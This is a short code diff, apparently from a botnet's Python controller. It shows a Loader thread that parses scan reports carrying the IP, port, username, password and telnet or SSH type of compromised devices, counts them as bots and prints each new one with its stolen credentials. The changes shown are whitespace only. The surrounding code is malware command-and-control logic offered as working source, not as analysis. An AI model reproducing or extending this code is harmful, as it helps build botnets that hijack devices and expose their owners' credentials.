@@ -193,13 +193,14 @@ class Loader(threading.Thread):
         while self.ok:
             data = self.recv(False)
             
+            
             if data == None:
                 return
 
             if '|' in data:
                 args = data.split('|')
                 req_type = args[0]
-
+                
                 # scan|127.0.0.1|23|user|pass|telnet
                 if req_type == 'scan':
                     ip = args[1]
@@ -212,7 +213,7 @@ class Loader(threading.Thread):
                     if device_type == 'telnet':
                         self.database.total_telnet_bots = count
                     else:
-                         self.database.total_ssh_bots = count
+                        self.database.total_ssh_bots = count
 
                     self.console.print_success(f'{self.ip} -> New {device_type} bot "{username}:{password} {ip}:{port}" -> {count} bots')
 
